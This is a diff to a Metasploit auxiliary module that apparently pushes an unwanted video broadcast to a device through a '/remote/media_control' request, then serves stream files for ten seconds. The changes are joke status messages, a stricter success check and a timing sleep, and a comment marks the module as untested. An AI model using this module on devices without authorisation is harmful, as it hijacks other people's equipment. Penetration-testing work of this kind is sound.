@@ -34,7 +34,7 @@ class MetasploitModule < Msf::Auxiliary
   def run
     start_service('Path' => '/')
 
-    print_status("Sending fake broadcast to #{peer}")
+    print_status("Broadcasting Epic Sax Guy to #{peer}")
     res = send_request_cgi(
       'method'        => 'GET',
       'uri'           => '/remote/media_control',
@@ -45,12 +45,15 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    unless res && res.code == 200
-      print_error('No fake video was broadcasted')
+    unless res && res.code == 200 && res.body.include?('OK')
+      print_error('No doo-doodoodoodoodoo-doo for you')
       return
     end
 
-    print_good('Fake video was broadcasted')
+    # Sleep time calibrated using successful pcap
+    print_good('Doo-doodoodoodoodoo-doo')
+    print_status('Sleeping for 10s serving .m3u8 and .ts files...')
+    sleep(10)
   end
 
   # XXX: Untested! Please remove this comment if it works, RootUp
